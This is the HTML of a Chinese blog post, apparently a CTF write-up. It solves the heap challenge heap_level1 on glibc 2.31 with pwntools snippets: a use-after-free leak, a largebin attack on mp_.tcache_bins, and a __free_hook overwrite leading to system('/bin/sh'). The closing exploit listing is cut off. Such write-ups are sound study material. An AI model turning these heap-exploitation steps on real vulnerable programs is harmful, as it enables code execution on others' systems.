@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/faceicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/faceicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="从一道堆题入门mp_.tcache_bins的利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mp_.tcache_bins">
+<meta property="og:url" content="http://example.com/2023/03/10/mp-tcache-bins/index.html">
+<meta property="og:site_name" content="1903">
+<meta property="og:description" content="从一道堆题入门mp_.tcache_bins的利用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/03/10/mp-tcache-bins/image-20230310205051278.png">
+<meta property="og:image" content="http://example.com/2023/03/10/mp-tcache-bins/image-20230310205159925.png">
+<meta property="og:image" content="http://example.com/2023/03/10/mp-tcache-bins/image-20230310205438785.png">
+<meta property="og:image" content="http://example.com/2023/03/10/mp-tcache-bins/image-20230310215933413.png">
+<meta property="og:image" content="http://example.com/2023/03/10/mp-tcache-bins/image-20230310220519844.png">
+<meta property="og:image" content="http://example.com/2023/03/10/mp-tcache-bins/image-20230310221100830.png">
+<meta property="article:published_time" content="2023-03-10T10:39:43.000Z">
+<meta property="article:modified_time" content="2023-03-10T14:47:22.419Z">
+<meta property="article:author" content="hhhhhh_">
+<meta property="article:tag" content="-PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/03/10/mp-tcache-bins/image-20230310205051278.png">
+
+<link rel="canonical" href="http://example.com/2023/03/10/mp-tcache-bins/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>mp_.tcache_bins | 1903</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">1903</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/10/mp-tcache-bins/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="hhhhhh_">
+      <meta itemprop="description" content="想去北方看看">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1903">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          mp_.tcache_bins
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-10 18:39:43 / 修改时间：22:47:22" itemprop="dateCreated datePublished" datetime="2023-03-10T18:39:43+08:00">2023-03-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">-堆</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>从一道堆题入门mp_.tcache_bins的利用</p>
+<span id="more"></span>
+
+<h3 id="heap-level1"><a href="#heap-level1" class="headerlink" title="heap_level1"></a>heap_level1</h3><p>（同样是想到什么写什么，就直接复现题目</p>
+<h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><p>就不一一细说了，主要点：</p>
+<ol>
+<li><p>分配的chunk为large chunk（0x41F - 0x550</p>
+</li>
+<li><p>存在UAF</p>
+</li>
+<li><p>白送一半的libc地址，要爆破？（其实可以不送</p>
+</li>
+</ol>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>（因为复现，提前知道了大体思路：Largebin attack改mp_.tcache_bins，再打__free_hook。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x500, 0, &#x27;a&#x27;)</span><br><span class="line">add(0x520, 1, &#x27;a&#x27;)</span><br><span class="line">add(0x510, 2, &#x27;a&#x27;)</span><br><span class="line">add(0x530, 3, &#x27;a&#x27;)</span><br><span class="line">add(0x420, 4, &#x27;/bin/sh\x00&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h5 id="leak-libc-amp-heap-address"><a href="#leak-libc-amp-heap-address" class="headerlink" title="leak libc &amp; heap address"></a>leak libc &amp; heap address</h5><p>unsorted bin中两个chunk的fd指针分别泄露libc和heap：</p>
+<p>（其中unsorted bin head的偏移并非88，而是96，调试得知（libc-2.31</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">libc.address = u64(sh.recv(6).ljust(8, &#x27;\x00&#x27;)) - 96 - 0x10 - libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&quot;libc: &quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">heap = u64(sh.recv(6).ljust(8, &#x27;\x00&#x27;)) - 0x290</span><br><span class="line">print(&quot;heap: &quot;, hex(heap))</span><br></pre></td></tr></table></figure>
+
+<h5 id="search-function-address"><a href="#search-function-address" class="headerlink" title="search function address"></a>search function address</h5><p>计算一些用得到的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__free_hook = libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">mp_ = libc.address + 0x1ec280</span><br><span class="line">tcache_bins = mp_ + 80</span><br><span class="line">#print(hex(tcache_bins))</span><br></pre></td></tr></table></figure>
+
+<p>（libc中貌似没有mp_结构体的符号？这里只得用偏移来计算</p>
+<h6 id="mp-和tcache-bins"><a href="#mp-和tcache-bins" class="headerlink" title="mp_和tcache__bins"></a>mp_和tcache__bins</h6><p>这里追一下源码：</p>
+<p>​	首先说说为什么需要修改mp_.tcache_bins字段，看一段源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">_int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">...</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	以2.31的libc为例，在_int_free中tcache部分代码的最开头存在对tc_idx的检查，其实就是tcache的size不超过tcache_bins这个idx所对应的size（也是free过程中唯一一次检查，在tcache_puts中并无对tcache chunk的size进行检查；</p>
+<p>​	再看看mp_的结构体：（TCACHE_MAX_BINS是一个宏定义，为64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static struct malloc_par mp_ =</span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (1)</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),</span><br><span class="line">  .tcache_unsorted_limit = 0 /* No limit.  */</span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>​	看到这里可能会疑惑为什么看这些，与libc-2.27比较一下便知（分别是_int_free和tcache_put：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    if (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	return;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	虽然在_int_free中也有与tcache_bins的比较，但在tcache_put中直接引用了TCACHE_MAX_BINS这个宏来对idx进行检查，也就几乎没利用的可能了，所以打mp_.tcache_bins来使较大size的chunk入tcache bin的手法，需在较高版本（libc-2.30及以上，27、28、29都存在）使用；</p>
+<h5 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h5><p>​	large bin attack本来有两个地方可以利用：</p>
+<ol>
+<li>待放入的chunk的size小于链表中最小的size；</li>
+<li>size和bin中的chunk不正好相同；</li>
+</ol>
+<p>check：（libc-2.31完全封堵了第三个分支的两个利用点（虽然我也还没玩明白^_^</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">else</span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      if (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​	这里就直接考虑第一个分支（用最后对fd_nextsize的写入；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fwd = bck;			#fwd为链表头</span><br><span class="line">bck = bck-&gt;bk;		#bck为链表中最后一个chunk</span><br><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
+
+<h6 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h6><p>​	先将先前泄露地址的两个chunk中的较小的申请回来（到时进入第一分支用，也避免large bin中情况过于复杂；</p>
+<p>​	再申请一个此时bin中无法满足的size的chunk，来进入unsorted bin遍历，使chunk入对应large bin；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(0x500, 5, &#x27;a&#x27;)</span><br><span class="line">add(0x540, 6, &#x27;a&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>​	布置此时已经在large bin中的的chunk的bk_nextsize指针为target-0x20；</p>
+<blockquote>
+<p> 主要用的是这一部分：victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(libc.address + 0x1ed010)*2 + p64(heap + 0xcd0) + p64(tcache_bins - 0x20)</span><br><span class="line">edit(2,payload)</span><br></pre></td></tr></table></figure>
+
+<p>​	释放较小的size的chunk，入unsorted bin，为large bin attack作准备；（0和5指向同一片内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(0)</span><br></pre></td></tr></table></figure>
+
+<p>​	申请较大size的chunk，最终触发large bin attack；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x540,7,&#x27;a&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h6 id="调试一下："><a href="#调试一下：" class="headerlink" title="调试一下："></a>调试一下：</h6><p><img src="/2023/03/10/mp-tcache-bins/image-20230310205051278.png" alt="image-20230310205051278"></p>
+<p>​	tcache_bins如约被修改为一个很大的值，x看一下会发现确实是堆上的地址；</p>
+<p><img src="/2023/03/10/mp-tcache-bins/image-20230310205159925.png" alt="image-20230310205159925"></p>
+<p>再回去看heap，是我们最后free的较小的chunk无疑：</p>
+<p><img src="/2023/03/10/mp-tcache-bins/image-20230310205438785.png" alt="image-20230310205438785"></p>
+<p>（因为large bin attack也算第一次实践，所以废话有点多哈^_^</p>
+<h6 id="tidx的计算"><a href="#tidx的计算" class="headerlink" title="tidx的计算"></a>tidx的计算</h6><p>（可能有点唐突，但一定有用：</p>
+<p>csize2tidx(x)：其实就是0x10一个间隔，0对应0x20，所以效果相当于chunksize&#x2F;0x10-2（括号中的x即chunksize</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br></pre></td></tr></table></figure>
+
+<p>MINSIZE：其实是对MIN_CHUNK_SIZE（0x20，根据结构体计算偏移）进行进位操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MINSIZE  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure>
+
+<p>MALLOC_ALIGN_MASK：0xF（掩码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span><br></pre></td></tr></table></figure>
+
+<p>MALLOC_ALIGNMENT：0x10就对了（2 * SIZE_SZ</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span><br><span class="line">			  ? __alignof__ (long double) : 2 * SIZE_SZ)</span><br></pre></td></tr></table></figure>
+
+<h5 id="tcache下的利用"><a href="#tcache下的利用" class="headerlink" title="tcache下的利用"></a>tcache下的利用</h5><p>​	将两次申请的0x540的chunk释放进tcache bin中；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(6)</span><br><span class="line">delete(7)</span><br></pre></td></tr></table></figure>
+
+<h6 id="调试一下：-1"><a href="#调试一下：-1" class="headerlink" title="调试一下："></a>调试一下：</h6><p>（调试过程中pwndbg和peda的heap都未识别到tcache bin中的chunk。。但是从tcache_perthread_struct结构体中依然可以看出</p>
+<p>先看下tcache_perthread_struct的定义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  uint16_t counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
+
+<p>​	uint16_t意味着每两个字节用来存放一个count；</p>
+<p>我们在两次free中间pause()：</p>
+<p>第一次free后：</p>
+<p><img src="/2023/03/10/mp-tcache-bins/image-20230310215933413.png" alt="image-20230310215933413"></p>
+<p>​	chunk的size为0x550对应idx为83，即第83个uint16_t，在第21个字段的最高两字节；（已有1个tcache chunk</p>
+<p>第二次free后：</p>
+<p><img src="/2023/03/10/mp-tcache-bins/image-20230310220519844.png" alt="image-20230310220519844"></p>
+<p>（之所以看这个是之前存有疑问：就是申请时对count的检查，但本题不需要绕过；</p>
+<p>再x看下这两个free的chunk：</p>
+<p>​	tcache bin单链表的结构清晰可见；而bk的位置也填上了key（tcache的地址；</p>
+<p><img src="/2023/03/10/mp-tcache-bins/image-20230310221100830.png" alt="image-20230310221100830"></p>
+<p>但这个的key有个0x10的偏移？追一波源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<p>看tcache：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">tcache_init(void)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  ...</span><br><span class="line">  if (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在看_int_malloc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br></pre></td></tr></table></figure>
+
+<p>​	在返回chunk前都会有这么一段代码，即给的是直接指向用户区域的指针；</p>
+<p>（看到这里就很明了了</p>
+<h5 id="劫持-free-hook"><a href="#劫持-free-hook" class="headerlink" title="劫持__free_hook"></a>劫持__free_hook</h5><p>​	这里就是改fd，申请到__free_hook，写入system；（就不赘述了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(7,p64(__free_hook))</span><br><span class="line">add(0x540,8,p64(system))</span><br><span class="line">add(0x540,9,p64(system))</span><br></pre></td></tr></table></figure>
+
+<h5 id="system-‘-x2F-bin-x2F-sh’"><a href="#system-‘-x2F-bin-x2F-sh’" class="headerlink" title="system(‘&#x2F;bin&#x2F;sh’)"></a>system(‘&#x2F;bin&#x2F;sh’)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(4)</span><br></pre></td></tr></table></figure>
+
+<p>这里调用的参数一直有点似懂非懂，追一波源码！</p>
+<p>以__free_hook为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">__libc_free (void *mem)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  void (*hook) (void *, const void *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  if (__builtin_expect (hook != NULL, 0))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (0));</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">   	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	mem即指向chunk的用户区域；（所以布置&#x2F;bin&#x2F;sh是可行的</p>
+<p>贴上exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 